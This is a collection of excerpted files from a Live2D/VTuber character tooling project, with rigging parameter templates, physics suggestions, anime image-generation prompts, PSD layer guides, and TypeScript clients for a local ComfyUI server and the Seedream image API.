            # 完整模板
            ParameterTemplate(
                name='完整模板',
                description='包含所有参数的完整配置',
                parameters=(
                    self.standard_params['angle'] +
                    self.standard_params['eye'] +
                    self.standard_params['eyebrow'] +
                    self.standard_params['mouth'] +
                    self.standard_params['body'] +
                    self.standard_params['special']
                ),
                suitable_for=['专业角色', '高质量VTuber']
            ),
            # 简单模板
            ParameterTemplate(
                name='简单模板',
                description='适合简单角色的最小参数集',
                parameters=(
                    self.standard_params['angle'][:1] +
                    self.standard_params['eye'][:2] +
                    self.standard_params['mouth'][:1]
                ),
                suitable_for=['简单角色', 'PNG VTuber']
            ),
            # 表情丰富模板
            ParameterTemplate(
                name='表情丰富模板',
                description='强调表情变化的参数配置',
                parameters=(
                    self.standard_params['angle'] +
                    self.standard_params['eye'] +
                    self.standard_params['eyebrow'] +
                    self.standard_params['mouth'] +
                    [Parameter('ParamEyeHappy', 0, 1, 0, '开心眼睛', 'expression'),
                     Parameter('ParamEyeSad', 0, 1, 0, '悲伤眼睛', 'expression'),
                     Parameter('ParamEyeAngry', 0, 1, 0, '生气眼睛', 'expression'),
                     Parameter('ParamEyeSurprised', 0, 1, 0, '惊讶眼睛', 'expression')]
                ),
                suitable_for=['表情丰富的角色', '互动VTuber']
            ),
            # 物理丰富模板
            ParameterTemplate(
                name='物理丰富模板',
                description='强调物理效果的参数配置',
                parameters=(
                    self.standard_params['angle'] +
                    self.standard_params['eye'] +
                    self.standard_params['mouth'] +
                    self.standard_params['body'] +
                    [Parameter('ParamHairFront', -1, 1, 0, '前发物理', 'body'),
                     Parameter('ParamHairBack', -1, 1, 0, '后发物理', 'body'),
                     Parameter('ParamHairSide', -1, 1, 0, '侧发物理', 'body'),
                     Parameter('ParamSkirt', -1, 1, 0, '裙子物理', 'body'),
                     Parameter('ParamAccessory1', -1, 1, 0, '配饰1物理', 'body'),
                     Parameter('ParamAccessory2', -1, 1, 0, '配饰2物理', 'body')]
                ),
                suitable_for=['长发角色', '有裙子的角色', '有配饰的角色']
            ),
        ]
    
    def get_template(self, template_name: str) -> Optional[ParameterTemplate]:
        """获取指定模板"""
        for template in self.templates:
            if template.name == template_name:
                return template
        return None
    
    def get_recommended_template(self, character_features: List[str]) -> ParameterTemplate:
        """根据角色特征推荐模板"""
        # 按匹配度排序
        scored_templates = []
        
        for template in self.templates:
            score = sum(
                1 for feature in character_features 
                if feature in template.suitable_for
            )
            scored_templates.append((score, template))
        
        # 返回匹配度最高的
        scored_templates.sort(key=lambda x: x[0], reverse=True)
        return scored_templates[0][1]
    
    def generate_parameter_combinations(self) -> List[Dict[str, Any]]:
        """生成参数组合建议"""
        combinations = [
            {
                'name': '头部动作组合',
                'description': '头部自然转动的参数组合',
                'parameters': ['ParamAngleX', 'ParamAngleY', 'ParamAngleZ'],
                'usage': '用于实现自然的头部转动动画'
            },

...（省略后续 216 行，原文件共 436 行）...

```

## 物理设置助手（节选）
**文件**：`.trae/skills/live2d-master-agent/scripts/physics_helper.py`
```
#!/usr/bin/env python3
"""
物理设置辅助脚本
用于生成物理参数建议
"""

from dataclasses import dataclass


@dataclass
class PhysicsParams:
    gravity: float = 0.5
    wind: float = 0.0
    restitution: float = 0.5
    damping: float = 0.9
    point_count: int = 5


def get_physics_suggestion(part: str) -> PhysicsParams:
    """
    获取物理参数建议
    :param part: 部件类型 (hair_front, hair_back, ear, tail, etc.)
    :return: 物理参数
    """
    suggestions = {
        "hair_front": PhysicsParams(gravity=0.4, restitution=0.6, point_count=5),
        "hair_back": PhysicsParams(gravity=0.7, restitution=0.5, point_count=8),
        "ear": PhysicsParams(gravity=0.3, restitution=0.7, point_count=3),
        "tail": PhysicsParams(gravity=0.6, restitution=0.5, point_count=10),
        "ribbon": PhysicsParams(gravity=0.5, restitution=0.4, point_count=6),
    }
    
    return suggestions.get(part, PhysicsParams())


if __name__ == "__main__":
    print("Live2D 物理参数建议工具")
    print("---------------------")
    
    test_parts = ["hair_front", "hair_back", "ear", "tail"]
    
    for part in test_parts:
        params = get_physics_suggestion(part)
        print(f"\n{part}:")
        print(f"  重力: {params.gravity}")
        print(f"  风力: {params.wind}")
        print(f"  回复力: {params.restitution}")
        print(f"  阻尼: {params.damping}")
        print(f"  物理点数量: {params.point_count}")

```

## 图像生成提示词（节选）
**文件**：`prompts/image_generation.md`
```
# Live2D 角色立绘生成提示词

本文件包含用于生成高质量 Live2D 角色立绘的提示词模板和参数配置。

---

## 🎨 Seedream 高质量图像生成

### 版本说明

| 版本 | 模型名称 | 描述 | 推荐场景 |
|------|----------|------|----------|
| **5.0** | doubao-seedream-5-0-260128 | 当前最强版本！突破性创意表达和超高细节质量 | **推荐用于 Live2D** |
| **4.5** | doubao-seedream-4-5-251128 | 细节表现更好，复杂场景处理更优 | 高质量日常使用 |
| **4.0** | doubao-seedream-4-0-250828 | 稳定可靠，响应快速 | 快速预览 |

### 质量级别与 Seedream 映射

| 质量级别 | Seedream 版本 | 分辨率 | 描述 |
|---------|--------------|--------|------|
| **Ultra** | 5.0 | 4096×4096 | 超高质量，8K级别细节 |
| **High** | 5.0 | 2048×2048 | 高质量，细节丰富 |
| **Standard** | 4.5 | 2048×2048 | 标准质量，平衡速度与效果 |
| **Draft** | 4.0 | 1024×1024 | 快速预览 |

### Seedream 支持的分辨率

- **1K**: 1024×1024
- **2K**: 2048×2048
- **3K**: 3072×3072
- **4K**: 4096×4096
- 自定义: 如 `2048x3072`

---

## 质量级别预设

| 级别 | 步数 | CFG | Seedream版本 | 描述 |
|------|------|-----|-------------|------|
| **Draft** | 15 | 5.5 | 4.0 | 快速预览，质量一般 |
| **Standard** | 25 | 7.0 | 4.5 | 标准质量，平衡速度与效果 |
| **High** | 35 | 7.5 | 5.0 | 高质量，细节丰富 |
| **Ultra** | 50 | 8.0 | 5.0 | 超高质量，8K 级别细节 |

---

## 分辨率预设

| 预设 | 尺寸 | 适用场景 |
|------|------|----------|
| square-512 | 512×512 | 小图标、缩略图 |
| square-768 | 768×768 | 标准头像 |
| square-1024 | 1024×1024 | 高质量头像 |
| square-1280 | 1280×1280 | 超高清头像 |
| square-2048 | 2048×2048 | Seedream 标准质量 |
| square-4096 | 4096×4096 | Seedream 超高质量 |
| portrait-512x768 | 512×768 | 小尺寸半身像 |
| portrait-768x1024 | 768×1024 | 标准半身像 |
| portrait-1024x1536 | 1024×1536 | 高质量半身像 |
| portrait-2048x3072 | 2048×3072 | Seedream 高质量半身像 |

---

## 风格类型

### 1. Anime (动漫风格) - **推荐用于 Live2D**
```
anime style, beautiful detailed anime artwork, anime aesthetic, sharp clean lines, vibrant colors, studio quality animation cel
```
**负面提示词**: 3d, realistic, photo, photograph, text, watermark

### 2. Realistic (写实风格)
```
hyperrealistic, photorealistic, highly detailed, lifelike, cinematic lighting, professional photography
```
**负面提示词**: cartoon, anime, drawing, sketch, text, watermark

### 3. Cel-shaded (赛璐珞风格)
```
cel shaded, flat colors, clean outlines, 2D animation style, Toon shader, bold lines
```
**负面提示词**: realistic, 3d render, photorealistic, text, watermark

### 4. Watercolor (水彩风格)
```
watercolor painting, soft brush strokes, watercolor wash, delicate colors, artistic texture
```
**负面提示词**: digital art, 3d render, photorealistic, text, sharp edges

### 5. Pixel-art (像素风格)
```
pixel art, retro 8-bit style, pixel perfect, nostalgic gaming aesthetic, crisp pixels
```
**负面提示词**: smooth, anti-aliased, 3d, realistic, text

### 6. 3D Render (3D渲染)
```
3D render, blender, octane render, realistic materials, ray tracing, cinematic
```
**负面提示词**: 2d, flat, cartoon, hand-drawn, text, watermark

### 7. Oil Painting (油画风格)
```
oil painting, brush strokes, classic art style, textured canvas, masterful technique
```
**负面提示词**: digital art, 3d render, photorealistic, text, watermark

---

## 提示词模板

### 模板 1: 基础 VTuber 角色
```
可爱的二次元动漫女孩，正面朝向，半身像，粉色长发双马尾，蓝色大眼睛，水手服，可爱的表情，白色背景
```

### 模板 2: 兽耳 VTuber (猫耳)
```
可爱的动漫女孩，正面半身像，猫耳，金色长发，绿色眼睛，洛丽塔风格连衣裙，甜美的微笑，白色背景
```

### 模板 3: 兽耳 VTuber (兔耳)
```
可爱的兔耳女孩，正面朝向，粉色短发，红色眼睛，偶像风格服装，开心的表情，纯白色背景
```

### 模板 4: 优雅角色
```
优雅的二次元女性角色，正面朝向，深蓝色中长发，紫色眼睛，黑色连衣裙，平静的表情，精致的妆容，白色背景
```

### 模板 5: Q版角色
```
Q版可爱动漫女孩，正面朝向，粉色短发，红色大眼睛，校服风格，开心的表情，白色背景，简单干净的线条
```

### 模板 6: 男性角色
```
帅气的二次元男性角色，正面半身像，黑色短发，蓝色眼睛，休闲服装，自信的微笑，白色背景
```

---

## Live2D 专用增强关键词

```
perfect for Live2D rigging, clean layer separation, isolated character, solid background, easy to rig, professional artwork
```

---

## 高质量关键词

### 画质提升
```
高质量，高分辨率，8K，4K，精致的细节，超详细，锐利清晰
```

### 艺术风格
```
插画风格，动漫风格，专业插画，工作室质量，获奖作品
```

### Live2D 适配
```
适合 Live2D 建模，清晰分层，纯色背景，易于绑定，干净的线条
```

---

## 负面提示词基础
```
low quality, blurry, distorted, pixelated, ugly, deformed, bad anatomy, disfigured, poorly drawn face, mutation, mutated, extra limb, missing limb, floating limbs, disconnected limbs, malformed hands, long neck, bad proportions, watermark, text, signature, logo, cropped, out of frame
```

---

## 完整提示词示例

### 示例 1: Seedream 5.0 高质量动漫角色
```
anime style, beautiful detailed anime artwork, cute anime girl, front view, half body, pink long hair twin tails, big blue eyes, sailor uniform, sweet smile, white background, 8K, ultra detailed, masterpiece, award-winning, professional artwork, perfect for Live2D rigging, clean layer separation, isolated character, solid background
```

**推荐参数:**
- Seedream 版本: 5.0
- 分辨率: 4096×4096
- 输出格式: PNG

### 示例 2: Seedream 5.0 超高质量兽耳角色
```
anime style, beautiful detailed anime artwork, cute cat girl, front facing, half body portrait, golden long hair, green eyes, lolita dress, happy expression, pure white background, 8K resolution, ultra detailed, masterpiece quality, stunning visuals, perfect for Live2D rigging, clean layers, easy to animate
```

**推荐参数:**
- Seedream 版本: 5.0
- 分辨率: 2048×2048
- 输出格式: PNG

### 示例 3: Q版角色
```
chibi anime style, cute chibi girl, front view, pink short hair, big red eyes, school uniform, cheerful expression, white background, high quality, clean lines, simple design, perfect for Live2D chibi rigging
```

**推荐参数:**
- Seedream 版本: 4.5
- 分辨率: 1024×1024
- 输出格式: PNG

---

## 使用 Seedream 生成 Live2D 立绘

### 配置 API Key

```typescript
import { SeedreamService } from './lib/seedream-service';

const service = new SeedreamService();
service.setApiKey('your-ark-api-key');
```

### 生成高质量立绘

```typescript
const result = await service.generate(
  'cute anime girl, pink hair, blue eyes, sailor uniform',
  {
    version: '5.0',
    size: '4096x4096',
    outputFormat: 'png',
    watermark: false,
  }
);
```

### 使用 ImageGenStep

```typescript
import { ImageGenStep } from './lib/steps';

const step = new ImageGenStep();
const result = await step.execute({
  prompt: 'cute anime girl, pink hair, blue eyes',
  useSeedream: true,
  quality: 'ultra',
  style: 'anime',
});
```

```

## 分层提示词（节选）
**文件**：`prompts/split.md`
```
# 分层规划提示词

请根据提供的角色立绘，输出详细的 PSD 分层方案。

要求：
1. 列出所有需要的图层，使用规范命名
2. 说明每个图层的用途
3. 标注层级顺序（从上到下）
4. 指出可能存在遮挡风险的区域
5. 建议需要独立拆分的部件

```

## PSD 结构模板（节选）
**文件**：`templates/psd_structure.md`
```
# PSD 图层结构模板

## 层级顺序（从上到下）

1. 头发最前层
2. 头发前层
3. 脸部装饰
4. 眼睛
5. 嘴巴
6. 脸部基础
7. 头发侧层
8. 头发后层
9. 衣服
10. 身体
11. 背景

## 图层命名示例

```
hair_front_01
hair_front_02
hair_side_l_01
hair_side_r_01
hair_back_01
face_base
face_shadow
eye_l_white
eye_l_iris
eye_l_pupil
eye_r_white
eye_r_iris
eye_r_pupil
mouth_base
mouth_a
mouth_i
mouth_u
mouth_e
mouth_o
body_base
clothes_top
```

```

## 案例：动漫女孩（节选）
**文件**：`examples/anime_girl_case.md`
```
# 动漫女孩案例

## 角色描述
- 粉色长发
- 蓝色眼睛
- 穿着水手服
- 有猫耳

## PSD 分层方案

### 图层顺序（从上到下）
1. hair_front_01（刘海最前）
2. hair_front_02（刘海第二层）
3. ear_l（左耳）
4. ear_r（右耳）
5. eye_l_white
6. eye_l_iris
7. eye_l_pupil
8. eye_r_white
9. eye_r_iris
10. eye_r_pupil
11. mouth_base
12. mouth_a
13. mouth_i
14. mouth_u
15. mouth_e
16. mouth_o
17. face_base
18. face_shadow
19. hair_side_l_01
20. hair_side_r_01
21. hair_back_01
22. hair_back_02
23. clothes_top
24. body_base

## 物理建议
- 前发：物理点 5 个，重力 0.5
- 后发：物理点 8 个，重力 0.7
- 耳朵：物理点 3 个，重力 0.3

```

## ComfyUI 连接器（节选）
**文件**：`comfyui-connector/src/connectors/comfyui.connector.ts`
```
import axios, { AxiosInstance } from 'axios';
import FormData from 'form-data';
import * as fs from 'fs';
import * as path from 'path';
import { v4 as uuidv4 } from 'uuid';
import {
  ComfyUIConfig,
  GenerationInput,
  GenerationResult,
  HealthCheckResult,
  QueueItem,
  UploadResponse,
  ComfyUIHistory,
  GenerationProgress
} from '../types';

export class ComfyUIConnector {
  private client: AxiosInstance;
  private config: ComfyUIConfig;
  private outputDirectory: string;
  private tempDirectory: string;

  constructor(config?: Partial<ComfyUIConfig>) {
    this.config = {
      host: config?.host || '127.0.0.1',
      port: config?.port || 8188,
      protocol: config?.protocol || 'http',
      timeout: config?.timeout || 60000,
      outputDirectory: config?.outputDirectory || './output',
      tempDirectory: config?.tempDirectory || './temp'
    };

    const baseURL = `${this.config.protocol}://${this.config.host}:${this.config.port}`;
    this.client = axios.create({
      baseURL,
      timeout: this.config.timeout,
      headers: {
        'Content-Type': 'application/json'
      }
    });

    this.outputDirectory = this.config.outputDirectory;
    this.tempDirectory = this.config.tempDirectory;
    this.ensureDirectories();
  }

  private ensureDirectories(): void {
    if (!fs.existsSync(this.outputDirectory)) {
      fs.mkdirSync(this.outputDirectory, { recursive: true });
    }
    if (!fs.existsSync(this.tempDirectory)) {
      fs.mkdirSync(this.tempDirectory, { recursive: true });
    }
  }

  private getApiUrl(endpoint: string): string {
    return `${this.config.protocol}://${this.config.host}:${this.config.port}${endpoint}`;
  }

  async checkHealth(): Promise<HealthCheckResult> {
    try {
      const response = await this.client.get('/system_stats');
      return {
        success: true,
        connected: true,
        version: response.data.version || 'unknown',
        queue_size: response.data.queue_size || 0
      };
    } catch (error: any) {
      return {
        success: false,
        connected: false,
        error: error.message || 'Connection failed'
      };
    }
  }

  async uploadImage(imagePath: string, imageType: string = 'input'): Promise<UploadResponse> {
    try {
      const form = new FormData();
      form.append('image', fs.createReadStream(imagePath));
      form.append('type', imageType);

      const response = await this.client.post('/upload/image', form, {
        headers: form.getHeaders()
      });

      return response.data;
    } catch (error: any) {
      throw new Error(`Failed to upload image: ${error.message}`);
    }
  }

  async queuePrompt(promptWorkflow: object): Promise<{ prompt_id: string; number: number }> {
    try {
      const response = await this.client.post('/prompt', {
        prompt: promptWorkflow
      });
      return response.data;
    } catch (error: any) {
      throw new Error(`Failed to queue prompt: ${error.message}`);
    }
  }

  async getQueueInfo(): Promise<QueueItem[]> {
    try {
      const response = await this.client.get('/queue');
      const runningPrompts = response.data.running || [];
      const pendingPrompts = response.data.queue || [];

      const items: QueueItem[] = [];

      runningPrompts.forEach((item: any) => {
        items.push({
          prompt_id: item.prompt_id,
          status: 'running',
          progress: item.prompt?.progress || 0
        });
      });

      pendingPrompts.forEach((item: any, index: number) => {
        items.push({
          prompt_id: item.prompt_id,
          status: 'pending',
          progress: (index / (pendingPrompts.length + 1)) * 100
        });
      });

      return items;
    } catch (error: any) {
      throw new Error(`Failed to get queue info: ${error.message}`);
    }
  }

  async getHistory(promptId: string): Promise<ComfyUIHistory | null> {
    try {
      const response = await this.client.get(`/history/${promptId}`);
      return response.data[promptId] || null;
    } catch (error: any) {
      if (error.response?.status === 404) {
        return null;
      }
      throw new Error(`Failed to get history: ${error.message}`);
    }
  }

  async getProgress(promptId: string): Promise<GenerationProgress> {
    try {
      const response = await this.client.get(`/progress`);
      return {
        prompt_id: promptId,
        progress: response.data.value || 0,
        status: response.data.status === 'success' ? 'completed' : 'running'
      };
    } catch (error: any) {
      return {
        prompt_id: promptId,
        progress: 0,
        status: 'failed',
        message: error.message
      };
    }
  }

  async interruptExecution(): Promise<void> {
    try {
      await this.client.post('/interrupt');
    } catch (error: any) {
      throw new Error(`Failed to interrupt execution: ${error.message}`);
    }
  }

  async clearQueue(): Promise<void> {
    try {
      await this.client.post('/queue/clear');
    } catch (error: any) {
      throw new Error(`Failed to clear queue: ${error.message}`);
    }
  }

  getOutputImagePath(filename: string): string {
    return path.join(this.outputDirectory, filename);
  }

  async downloadImage(imageUrl: string, savePath?: string): Promise<string> {
    try {
      const filename = path.basename(imageUrl);
      const outputPath = savePath || path.join(this.outputDirectory, filename);

      const response = await this.client.get(imageUrl, {
        responseType: 'arraybuffer'
      });

      fs.writeFileSync(outputPath, Buffer.from(response.data));
      return outputPath;
    } catch (error: any) {
      throw new Error(`Failed to download image: ${error.message}`);
    }
  }

  async cleanupTempFiles(): Promise<void> {
    try {
      const files = fs.readdirSync(this.tempDirectory);
      for (const file of files) {
        const filePath = path.join(this.tempDirectory, file);
        fs.unlinkSync(filePath);
      }
    } catch (error: any) {
      console.error(`Failed to cleanup temp files: ${error.message}`);
    }
  }

  getConfig(): ComfyUIConfig {
    return { ...this.config };
  }

  setOutputDirectory(directory: string): void {
    this.outputDirectory = directory;
    this.config.outputDirectory = directory;
    this.ensureDirectories();
  }

  setTempDirectory(directory: string): void {
    this.tempDirectory = directory;
    this.config.tempDirectory = directory;
    this.ensureDirectories();
  }
}

```

## 图像生成服务（节选）
**文件**：`comfyui-connector/src/services/image-generation.service.ts`
```
import * as fs from 'fs';
import * as path from 'path';
import { v4 as uuidv4 } from 'uuid';
import { ComfyUIConnector } from '../connectors/comfyui.connector';
import { GenerationInput, GenerationResult, GenerationProgress } from '../types';

export class ImageGenerationService {
  private connector: ComfyUIConnector;
  private autoSave: boolean;
  private autoCleanup: boolean;
  private maxRetries: number;
  private retryDelay: number;

  constructor(connector: ComfyUIConnector, options?: {
    autoSave?: boolean;
    autoCleanup?: boolean;
    maxRetries?: number;
    retryDelay?: number;
  }) {
    this.connector = connector;
    this.autoSave = options?.autoSave ?? true;
    this.autoCleanup = options?.autoCleanup ?? true;
    this.maxRetries = options?.maxRetries ?? 3;
    this.retryDelay = options?.retryDelay ?? 5000;
  }

  async generate(input: GenerationInput): Promise<GenerationResult> {
    const startTime = Date.now();

    try {
      if (!input.prompt?.positive) {
        return {
          success: false,
          error: 'Positive prompt is required'
        };
      }

      let imageName: string | null = null;
      let maskName: string | null = null;

      if (input.image) {
        if (!fs.existsSync(input.image)) {
          return {
            success: false,
            error: `Input image not found: ${input.image}`
          };
        }
        const uploadResult = await this.connector.uploadImage(input.image);
        imageName = uploadResult.name;
      }

      if (input.mask) {
        if (!fs.existsSync(input.mask)) {
          return {
            success: false,
            error: `Mask image not found: ${input.mask}`
          };
        }
        const uploadResult = await this.connector.uploadImage(input.mask, 'mask');
        maskName = uploadResult.name;
      }

      const workflow = this.buildWorkflow(input, imageName, maskName);

      const { prompt_id } = await this.connector.queuePrompt(workflow);

      const result = await this.waitForCompletion(prompt_id);

      const duration = Date.now() - startTime;

      if (result.success && result.image_path) {
        if (this.autoCleanup) {
          await this.connector.cleanupTempFiles();
        }

        return {
          success: true,
          image_path: result.image_path,
          images: result.images,
          details: {
            prompt_id,
            status: 'completed',
            duration,
            seed: input.seed
          }
        };
      } else {
        return {
          success: false,
          error: result.error || 'Generation failed',
          details: {
            prompt_id,
            status: 'failed',
            duration
          }
        };
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || 'Unknown error occurred',
        details: {
          prompt_id: 'unknown',
          status: 'failed',
          duration: Date.now() - startTime
        }
      };
    }
  }

  private buildWorkflow(input: GenerationInput, imageName: string | null, maskName: string | null): object {
    const workflow: any = {};
    const seed = input.seed || Math.floor(Math.random() * 999999999);

    workflow['1'] = {
      class_type: 'CheckpointLoaderSimple',
      inputs: {
        ckpt_name: 'sd_xl_base_1.0.safetensors'
      }
    };

    workflow['2'] = {
      class_type: 'CLIPTextEncode',
      inputs: {
        text: input.prompt.positive,
        clip: ['1', 1]
      }
    };

    workflow['3'] = {
      class_type: 'CLIPTextEncode',
      inputs: {
        text: input.prompt.negative || 'low quality, blurry, deformed',
        clip: ['1', 1]
      }
    };

    if (imageName && maskName) {
      workflow['4'] = {
        class_type: 'LoadImage',
        inputs: {
          image: imageName
        }
      };

      workflow['5'] = {
        class_type: 'LoadImage',
        inputs: {
          image: maskName
        }
      };

      workflow['6'] = {
        class_type: 'KSampler',
        inputs: {
          seed: seed,
          steps: input.steps || 20,
          cfg: input.cfg || 7.0,
          sampler_name: 'euler',
          scheduler: 'normal',
          positive: ['2', 0],
          negative: ['3', 0],
          latent_image: ['9', 0]
        }
      };

      workflow['9'] = {
        class_type: 'VAEEncode',
        inputs: {
          pixels: ['4', 0],
          mask: ['5', 0],
          vae: ['1', 2]
        }
      };

      workflow['10'] = {
        class_type: 'VAEDecode',
        inputs: {
          samples: ['6', 0],
          vae: ['1', 2]
        }
      };
    } else if (imageName) {
      workflow['4'] = {
        class_type: 'LoadImage',
        inputs: {
          image: imageName
        }
      };

      workflow['6'] = {
        class_type: 'KSampler',
        inputs: {
          seed: seed,
          steps: input.steps || 20,
          cfg: input.cfg || 7.0,
          sampler_name: 'euler',
          scheduler: 'normal',
          positive: ['2', 0],
          negative: ['3', 0],
          latent_image: ['8', 0]
        }
      };

      workflow['8'] = {
        class_type: 'VAEEncode',
        inputs: {
          pixels: ['4', 0],
          vae: ['1', 2]
        }
      };

      workflow['10'] = {
        class_type: 'VAEDecode',
        inputs: {
          samples: ['6', 0],
          vae: ['1', 2]
        }
      };
    } else {
      const width = input.width || 1024;
      const height = input.height || 1024;

      workflow['4'] = {
        class_type: 'EmptyLatentImage',
        inputs: {
          batch_size: 1,
          height: height,
          width: width,
          seed: seed
        }
      };

      workflow['6'] = {
        class_type: 'KSampler',
        inputs: {
          seed: seed,
          steps: input.steps || 20,
          cfg: input.cfg || 7.0,
          sampler_name: 'euler',
          scheduler: 'normal',
          positive: ['2', 0],
          negative: ['3', 0],
          latent_image: ['4', 0]
        }
      };

      workflow['10'] = {
        class_type: 'VAEDecode',
        inputs: {

...（省略后续 125 行，原文件共 375 行）...

```

## Connector 依赖
**文件**：`comfyui-connector/package.json`
```
{
  "name": "comfyui-connector",
  "version": "1.0.0",
  "description": "本地 ComfyUI AI 绘图连接器 - Photoshop 插件专用",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "scripts": {
    "build": "tsc",
    "dev": "tsc --watch",
    "test": "jest",
    "lint": "eslint src/**/*.ts",
    "clean": "rm -rf dist"
  },
  "keywords": [
    "comfyui",
    "ai-art",
    "photoshop-plugin",
    "local-ai",
    "image-generation"
  ],
  "author": "",
  "license": "MIT",
  "dependencies": {
    "axios": "^1.6.0",
    "form-data": "^4.0.0",
    "uuid": "^9.0.0"
  },
  "devDependencies": {
    "@types/node": "^20.10.0",
    "@types/uuid": "^9.0.0",
    "@types/form-data": "^2.5.0",
    "@types/jest": "^29.5.0",
    "jest": "^29.5.0",
    "ts-jest": "^29.1.0",
    "typescript": "^5.3.0",
    "ts-node": "^10.9.0"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}

```

## Seedream 服务（节选）
**文件**：`lib/seedream-service.ts`
```
export type SeedreamVersion = '4.0' | '4.5' | '5.0';

export type SeedreamSize = 
  | '1024x1024' 
  | '2048x2048' 
  | '3072x3072' 
  | '4096x4096'
  | '1K' 
  | '2K' 
  | '3K' 
  | '4K';

export type OutputFormat = 'png' | 'jpeg';
export type ResponseFormat = 'url' | 'b64_json';

export interface SeedreamOptions {
  version?: SeedreamVersion;
  size?: SeedreamSize;
  outputFormat?: OutputFormat;
  responseFormat?: ResponseFormat;
  watermark?: boolean;
  timeout?: number;
  optimizePromptMode?: 'standard' | 'fast';
  enableWebSearch?: boolean;
  referenceImages?: string[];
  enableBatchGeneration?: boolean;
  maxImages?: number;
}

export interface SeedreamResult {
  success: boolean;
  images: Array<{
    name: string;
    url?: string;
    base64?: string;
  }>;
  error?: string;
  model: string;
  version: SeedreamVersion;
  generationTime: number;
}

const MODELS: Record<SeedreamVersion, string> = {
  '4.0': 'doubao-seedream-4-0-250828',
  '4.5': 'doubao-seedream-4-5-251128',
  '5.0': 'doubao-seedream-5-0-260128',
};

const VERSION_DESCRIPTIONS: Record<SeedreamVersion, string> = {
  '4.0': 'Seedream 4.0 - 稳定可靠，适合日常使用，响应快速',
  '4.5': 'Seedream 4.5 - 细节表现更好，复杂场景处理更优',
  '5.0': 'Seedream 5.0 - 当前最强版本！突破性创意表达和超高细节质量！',
};

const SUPPORTED_FIELDS: Record<SeedreamVersion, string[]> = {
  '4.0': ['size', 'response_format', 'watermark', 'image', 'sequential_image_generation', 'stream', 'optimize_prompt_options'],
  '4.5': ['size', 'response_format', 'watermark', 'image', 'sequential_image_generation', 'stream', 'optimize_prompt_options'],
  '5.0': ['size', 'response_format', 'watermark', 'image', 'sequential_image_generation', 'tools', 'output_format', 'stream', 'optimize_prompt_options'],
};

const LIVE2D_QUALITY_PRESETS = {
  ultra: {
    version: '5.0' as SeedreamVersion,
    size: '4096x4096' as SeedreamSize,
    optimizePromptMode: 'standard' as const,
  },
  high: {
    version: '5.0' as SeedreamVersion,
    size: '2048x2048' as SeedreamSize,
    optimizePromptMode: 'standard' as const,
  },
  standard: {
    version: '4.5' as SeedreamVersion,
    size: '2048x2048' as SeedreamSize,
    optimizePromptMode: 'standard' as const,
  },
  draft: {
    version: '4.0' as SeedreamVersion,
    size: '1024x1024' as SeedreamSize,
    optimizePromptMode: 'fast' as const,
  },
};

export class SeedreamService {
  private apiKey: string | null = null;
  private apiBase: string;

  constructor() {
    if (typeof window !== 'undefined') {
      this.apiKey = localStorage.getItem('seedream_api_key') || 
                    localStorage.getItem('ARK_API_KEY') ||
                    localStorage.getItem('MODEL_IMAGE_API_KEY');
    }
    this.apiBase = 'https://ark.cn-beijing.volces.com/api/v3';
  }

  setApiKey(key: string): void {
    this.apiKey = key;
    if (typeof window !== 'undefined') {
      localStorage.setItem('seedream_api_key', key);
    }
  }

  getVersionInfo(version: SeedreamVersion): { model: string; description: string; supportedFields: string[] } {
    return {
      model: MODELS[version],
      description: VERSION_DESCRIPTIONS[version],
      supportedFields: SUPPORTED_FIELDS[version],
    };
  }

  listVersions(): void {
    console.log('\n=== Seedream 可用版本 ===\n');
    for (const [version, desc] of Object.entries(VERSION_DESCRIPTIONS)) {
      const model = MODELS[version as SeedreamVersion];
      console.log(`版本 ${version}:`);
      console.log(`  模型名称: ${model}`);
      console.log(`  描述: ${desc}`);
      console.log(`  支持参数: ${SUPPORTED_FIELDS[version as SeedreamVersion].join(', ')}`);
      if (version !== '5.0') {
        console.log(`  ⚠️ 不支持: tools, output_format`);
      } else {
        console.log(`  ⭐ 独有支持: tools, output_format`);
      }
      console.log('');
    }
    console.log('推荐: 不确定时使用 5.0！');
  }

  private buildRequestBody(
    prompt: string,
    options: SeedreamOptions
  ): Record<string, unknown> {
    const version = options.version || '5.0';
    const body: Record<string, unknown> = {
      model: MODELS[version],
      prompt,
    };

    const supportedFields = SUPPORTED_FIELDS[version];

    if (supportedFields.includes('size') && options.size) {
      body.size = options.size;
    }

    if (supportedFields.includes('response_format') && options.responseFormat) {
      body.response_format = options.responseFormat;
    }

    if (supportedFields.includes('watermark') && options.watermark !== undefined) {
      body.watermark = options.watermark;
    }

    if (supportedFields.includes('output_format') && options.outputFormat) {
      body.output_format = options.outputFormat;
    }

    if (supportedFields.includes('optimize_prompt_options') && options.optimizePromptMode) {
      body.optimize_prompt_options = { mode: options.optimizePromptMode };
    }

    if (supportedFields.includes('tools') && options.enableWebSearch) {
      body.tools = [{ type: 'web_search' }];
    }

    if (options.referenceImages && options.referenceImages.length > 0) {
      body.image = options.referenceImages.length === 1 
        ? options.referenceImages[0] 
        : options.referenceImages;
    }

    if (options.enableBatchGeneration && supportedFields.includes('sequential_image_generation')) {
      body.sequential_image_generation = 'auto';
      body.sequential_image_generation_options = {
        max_images: Math.min(options.maxImages || 15, 15),
      };
    }

    return body;
  }

  async generate(
    prompt: string,
    options: SeedreamOptions = {}
  ): Promise<SeedreamResult> {
    const startTime = Date.now();
    const version = options.version || '5.0';

    if (!this.apiKey) {
      return {
        success: false,
        images: [],
        error: '请设置 API Key (ARK_API_KEY 或 MODEL_IMAGE_API_KEY)',
        model: MODELS[version],
        version,
        generationTime: Date.now() - startTime,
      };
    }

    try {
      const body = this.buildRequestBody(prompt, options);
      const url = `${this.apiBase}/images/generations`;

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${this.apiKey}`,
        },
        body: JSON.stringify(body),
      });

      if (!response.ok) {
        const errorText = await response.text();
        return {
          success: false,
          images: [],
          error: `API 请求失败: ${response.status} - ${errorText}`,
          model: MODELS[version],
          version,
          generationTime: Date.now() - startTime,
        };
      }

      const data = await response.json();
      const images: SeedreamResult['images'] = [];

      if (data.data && Array.isArray(data.data)) {
        for (let i = 0; i < data.data.length; i++) {
          const imageData = data.data[i];
          if (imageData.url) {
            images.push({ name: `image_${i}`, url: imageData.url });
          } else if (imageData.b64_json) {
            const mimeType = options.outputFormat === 'jpeg' ? 'image/jpeg' : 'image/png';
            images.push({ 
              name: `image_${i}`, 
              base64: `data:${mimeType};base64,${imageData.b64_json}` 
            });
          }
